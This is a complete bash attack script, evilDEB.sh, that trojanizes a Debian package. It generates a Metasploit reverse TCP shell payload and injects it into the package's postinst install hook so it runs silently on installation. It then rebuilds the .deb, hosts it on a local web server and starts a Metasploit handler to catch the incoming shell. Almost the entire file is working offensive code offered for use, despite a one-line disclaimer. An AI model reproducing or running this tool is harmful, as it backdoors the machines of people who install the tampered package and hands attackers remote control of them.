#!/bin/bash
#----------------------------------------------------------------------------------------------#
#evilDEB.sh v0.2 (#1 2010-09-28)                                                               #
# (C)opyright 2010 - g0tmi1k                                                                   #
#---Important----------------------------------------------------------------------------------#
#                     *** Do NOT use this for illegal or malicious use ***                     #
#              The programs are provided as is without any guarantees or warranty.             #
#---Defaults-----------------------------------------------------------------------------------#
# The interfaces to use
interface=eth0

#---Variables----------------------------------------------------------------------------------#
    verbose="0"              # Shows more info. 0=normal, 1=more , 2=more+commands
    debFile=""
       port=$(shuf -i 2000-65000 -n 1)
        svn="21"             # SVN Number
    version="0.2 (#1)"       # Program version
trap 'cleanup interrupt' 2   # Interrupt - "Ctrl + C"

#----Functions---------------------------------------------------------------------------------#
function action() { #action title command #screen&file #x|y|lines #hold
   error="free"
   if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Coding error
   if [ ! -z "$3" ] && [ "$3" != "true" ] && [ "$3" != "false" ] ; then error="3" ; fi # Coding error
   if [ ! -z "$5" ] && [ "$5" != "true" ] && [ "$5" != "false" ] ; then error="5" ; fi # Coding error

   if [ "$error" == "free" ] ; then
      xterm="xterm" #Defaults
      command=$2
      x="100"
      y="0"
      lines="15"
      if [ "$5" == "true" ] ; then xterm="$xterm -hold" ; fi
      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi
      if [ ! -z "$4" ] ; then
         x=$(echo $4 | cut -d '|' -f1)
         y=$(echo $4 | cut -d '|' -f2)
         lines=$(echo $4 | cut -d '|' -f3)
      fi
      $xterm -geometry 100x$lines+$x+$y -T "evilDEB v$version - $1" -e "$command"
      return 0
   else
      display error "action. Error code: $error" 1>&2
      return 1
   fi
}
function cleanup() { #cleanup #mode
   if [ "$1" == "nonuser" ] ; then exit 3 ;
   elif [ "$1" != "clean" ]
      echo # Blank line
      if [ "$verbose" != "0" ] ; then display info "*** BREAK ***" ; fi # User quit
      display action "Restoring: Environment"
      action "Killing 'Programs'" "killall python xterm"
   fi

   if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] ; then display action "Removing: Temp files" ; fi
   action "Removing files" "rm -rf /tmp/evilDEB/"

   echo -e "\e[01;36m[*]\e[00m Done! (= Have you... g0tmi1k?"
   exit 0
}
function help() { #help
   echo "(C)opyright 2010 g0tmi1k ~ http://g0tmi1k.blogspot.com

 Usage: bash evilDEB.sh -i [interface] -d [/path/to/file]


  Options:
   -i [interface]     ---  interface e.g. $interface
   -d [/path/to/file] ---  DEB file to use e.g. ~/my.deb

   -v                 ---  Verbose          (Displays more)
   -V                 ---  (Higher) Verbose (Displays more + shows commands)

   -u                 ---  Checks for an update
   -?                 ---  This screen


  Example:
   bash evilDEB.sh
   bash evilDEB.sh -i wlan0 -d my.deb


 Known issues:
    -Doesn't work with every DEB file
"
   exit 1
}
function display() { #display type message
   error="free"
   if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Coding error
   if [ "$1" != "action" ] && [ "$1" != "info" ] && [ "$1" != "diag" ] && [ "$1" != "error" ] ; then error="5" ; fi # Coding error

   if [ "$error" == "free" ] ; then
      output=""
      if [ "$1" == "action" ] ; then output="\e[01;32m[>]\e[00m"
      elif [ "$1" == "info" ] ; then output="\e[01;33m[i]\e[00m"
      elif [ "$1" == "diag" ] ; then output="\e[01;34m[+]\e[00m"
      elif [ "$1" == "error" ] ; then output="\e[01;31m[!]\e[00m" ; fi
      output="$output $2"
      echo -e "$output"

      return 0
   else
      display error "display. Error code: $error" 1>&2
      return 1
   fi
}
function update() { #update
   display action "Checking for an update"
   if [ -e "/usr/bin/svn" ] ; then
      command=$(svn info http://g0tmi1k.googlecode.com/svn/trunk/evilDEB/ | grep "Last Changed Rev:" | cut -c19-)
      if [ "$command" != "$svn" ] ; then
         display info "Updating"
         svn export -q --force "http://g0tmi1k.googlecode.com/svn/trunk/evilDEB" ./
         display info "Updated to $update (="
      else
         display info "You're using the latest version. (="
      fi
   else
      command=$(wget -qO- "http://g0tmi1k.googlecode.com/svn/trunk/" | grep "<title>g0tmi1k - Revision" |  awk -F " " '{split ($4,A,":"); print A[1]}')
      if [ "$command" != "$svn" ] ; then
         display info "Updating"
         wget -q -N "http://g0tmi1k.googlecode.com/svn/trunk/evilDEB/evilDEB.sh"
         display info "Updated! (="
      else
         display info "You're using the latest version. (="
      fi
   fi
   echo
   exit 2
}


#---Main---------------------------------------------------------------------------------------#
echo -e "\e[01;36m[*]\e[00m evilDEB v$version"

#----------------------------------------------------------------------------------------------#
if [ "$(id -u)" != "0" ] ; then display error "Run as root" 1>&2 ; cleanup nonuser; fi

#----------------------------------------------------------------------------------------------#
while getopts "d:i:vVuh?" OPTIONS; do
   case ${OPTIONS} in
      d   ) debFile=$OPTARG;;
      i   ) interface=$OPTARG;;
      v   ) verbose="1" ;;
      V   ) verbose="2" ;;
      u   ) update;;
      ?|h ) help;;
      *   ) display error "Unknown option" 1>&2 ;;   # Default
  esac
done
ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')

#----------------------------------------------------------------------------------------------#
display action "Analyzing: Environment"

#----------------------------------------------------------------------------------------------#
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] ; then display action "Stopping: Programs" ; fi
action "Killing Programs" "killall python xterm"

#----------------------------------------------------------------------------------------------#
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] ; then display action "Removing: Temp Files" ; fi
action "Removing temp files" "rm -rf /tmp/evilDEB/ ; mkdir -p /tmp/evilDEB/extracted/{DEBIAN,tmp}"

#----------------------------------------------------------------------------------------------#
if [ "$debFile" == "" ] ; then
   display action "Downloading: xbomb_2.1a-7_i386.deb"
   action "Downloading DEB" "apt-get -y remove xbomb ; apt-get -d install xbomb ; mv /var/cache/apt/archives/xbomb_2.1a-7_i386.deb /tmp/evilDEB/"
   debFile="xbomb_2.1a-7_i386.deb"
else
  cp "$debFile" "/tmp/evilDEB/"
fi

#----------------------------------------------------------------------------------------------#
display action "Extracting: .DEB"
action "Extracting" "dpkg -x \"/tmp/evilDEB/$debFile\" \"/tmp/evilDEB/extracted/\"; ar p \"/tmp/evilDEB/$debFile\" \"control.tar.gz\" | tar zx -C \"/tmp/evilDEB/extracted/DEBIAN/\""

#----------------------------------------------------------------------------------------------#
display action "Creating: Payload"
action "Creating Payload" "/opt/metasploit3/bin/msfpayload linux/x86/shell_reverse_tcp LHOST=$ourIP LPORT=$port X > /tmp/evilDEB/extracted/tmp/evilDEB"

#----------------------------------------------------------------------------------------------#
display action "Injecting: Payload"
if [ -e "postinst" ]; then echo -e "\nsudo chmod 2755 /tmp/evilDEB && nohup /tmp/evilDEB >/dev/null 2>&1 &" >> /tmp/evilDEB/extracted/DEBIAN/postinst
else echo -e "#! /bin/sh\n\nsudo chmod 2755 /tmp/evilDEB && nohup /tmp/evilDEB >/dev/null 2>&1 &" > /tmp/evilDEB/extracted/DEBIAN/postinst ; fi

#----------------------------------------------------------------------------------------------#
display action "Creating: .DEB"
action "Creating DEB" "chmod 755 /tmp/evilDEB/extracted/DEBIAN/postinst ; dpkg-deb --build /tmp/evilDEB/extracted && mv /tmp/evilDEB/extracted.deb /tmp/evilDEB/evilDEB-${debFile##*/} ; rm -rf /tmp/evilDEB/extracted ; rm -f /tmp/evilDEB/$debFile"

#----------------------------------------------------------------------------------------------#
display action "Running: Web server (http://$ourIP:80)"
tmp=$(pwd) ; cd /tmp/evilDEB ; python -m SimpleHTTPServer 80 & sleep 1 ; cd "$tmp"

#----------------------------------------------------------------------------------------------#
display action "Running: Metasploit"
/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=linux/x86/shell/reverse_tcp LHOST=$ourIP LPORT=$port E

#----------------------------------------------------------------------------------------------#
cleanup clean